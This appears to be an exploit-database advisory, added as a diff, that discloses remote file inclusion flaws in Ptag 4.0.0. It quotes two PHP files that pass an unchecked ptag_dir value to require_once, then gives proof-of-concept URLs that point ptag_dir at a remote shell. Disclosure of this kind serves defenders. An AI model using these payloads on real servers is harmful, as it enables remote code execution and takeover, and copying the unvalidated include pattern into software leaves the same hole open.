@@ -1,0 +1,66 @@
+##################################################################
+## Exploit Title: Ptag <= 4.0.0 Multiple RFI Exploit            ##
+## Date: 19-12-2009                                             ##
+## Author: cr4wl3r                                              ##
+## Software Link: http://sourceforge.net/projects/ptag/         ##
+## Version: N/A                                                 ##
+## Tested on: GNU/LINUX                                         ##
+##################################################################
+
+
+~ Code [session.php]
+
+<?php
+//Plottable Tagboard Systems Version 4.0.0 - ROLAND
+//Session handling File
+
+require_once(ptag_dir."lib/php/crossSession.php");
+class ptag_session extends crossSession{
+	public function __construct(){
+		global $ptag_sql;
+		$this -> sql_table = ptag_prefix."session";
+		$this -> cookie_name = ptag_prefix."session";
+		
+		//If RSS mode, switch session to non-viewed tracker.
+		if (ptag_output == "rss"){
+			parent::__construct($ptag_sql, sha1(""));
+		}
+		else{
+			parent::__construct($ptag_sql);
+		}
+	}
+}
+?>
+
+~ PoC
+
+[Ptag_path]/lib/session.php?ptag_dir=[Shell]
+
+
+
+
+~ Code [sql.php]
+
+<?php
+//Plottable Tagboard Systems Version 4.0.0 - ROLAND
+//Extending MySQL class
+
+require_once(ptag_dir."lib/php/ezmySQL.php");
+class ptag_sql extends ezmySQL{
+
+	public function __construct(){
+		parent::__construct(ptag_mysql_host, ptag_mysql_user, ptag_mysql_pass, ptag_mysql_db);
+	}
+	
+	protected function error_handler($err){
+		$error = "A MySQL error has occured: (".$err["errno"].") ".$err["error"]." when executing the query: ".$err["query"];
+		
+		return ptag_exception::handle_error($error, $err["line"], $err["file"], $err["class"], $err["method"]);
+	}
+}
+?>
+
+
+~ PoC
+
+[Ptag_path]/lib/sql.php?ptag_dir=[Shell]
